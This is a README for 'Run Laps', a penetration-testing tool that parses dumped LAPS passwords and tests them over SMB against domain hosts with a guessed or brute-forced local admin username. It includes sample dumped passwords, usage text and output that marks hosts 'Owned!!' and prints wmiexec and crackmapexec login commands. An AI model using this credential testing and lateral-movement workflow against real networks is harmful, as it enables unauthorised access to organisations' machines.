
<h4 align="center">Run Laps</h4>
<p align="center">
  <a href="https://twitter.com/sho_luv">
  <img src="https://img.shields.io/badge/Twitter-%40sho_luv-blue.svg">
  </a>
</p>

### Why:
Sometimes organizations change the name of their local administrator account. I have twice now been in a scenario where I was able to dump LAPS passwords but did not know the local administrator username because I did not have shell or domain creds yet. This can happen with ldap dump attacks. 

If you have domain creds you can use impacket to lookup the sids with the tool [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py). 

However if you do not have domain credentials you can always bruteforce the local admin username. 

This tool will help facilitate that effort.

### Example Laps Dump:

This is a tool to parse laps dumps files and test the password against the identified host in the file with a user supplied username. 

LAPS dumps can very from tool to tool, for instance this is what a dump looks like from `ntlmrelayx` with the `--dump-laps` option:

```plain
DN:CN=WINM9132S7S,OU=SHOLUV,OU=ACME_Computers,DC=ACME,DC=local
Password:S;5(7#8{h/i9M7E#
DN:CN=WIN4K6AI09J,OU=SHOLUV,OU=ACME_Computers,DC=ACME,DC=local
Password:Y87]@Y/bW&F5TVKT
DN:CN=WIN4K6AI0OL89J,OU=SHOLUV,OU=ACME_Computers,DC=ACME,DC=local
Password:S;5(7#8{h/i9M7E#

```


# Usage:
```
./runLAPS.py 
usage: runLAPS.py [-h] [-f laps file] [-u username or file] [-v] [-port [destination port]]

This program reads LAPS dumps and attempts to verify them

optional arguments:
  -h, --help            show this help message and exit
  -f laps file          ntlmrelayx laps format file
  -u username or file   username or file to try
  -v, --verbose         view verbose messages

connection:
  -port [destination port]
                        Destination port to connect to SMB Server
root@Id10t:~/work/mydev/run-laps# 

```

If you determine the username is `fido` you can feed this file into run-laps.py

### Example Run:
```
./run-laps.py -f laps-file.txt -u fido
```

### Example output:
```
Testing host: WINDOWS10-B and password: S;5(7#8{h/i9M7E# with username: fido
[*] Windows 10.0 Build 19041 0 (name:WINDOWS10-B) (domain:hackme.local) (signing:False) (SMBv1:False) Owned!!
[*] Local accounts admin rights:
[*] wmiexec.py 'sho_luv:S;5(7#8{h/i9M7E#'@192.168.86.84
[*] crackmapexec smb WINDOWS10 -u sho_luv -p S;5(7#8{h/i9M7E#


Testing host: WINDOWS10-A and password: Y87]@Y/bW&F5TVKT with username: fido
[*] Windows 10.0 Build 19041 0 (name:WINDOWS10-A) (domain:hackme.local) (signing:False) (SMBv1:False)
[*] Local accounts without admin rights:
[*] wmiexec.py 'notadmin:Y87]@Y/bW&F5TVKT'@192.168.86.84
[*] crackmapexec smb WINDOWS10 -u notadmin -p Y87]@Y/bW&F5TVKT

```

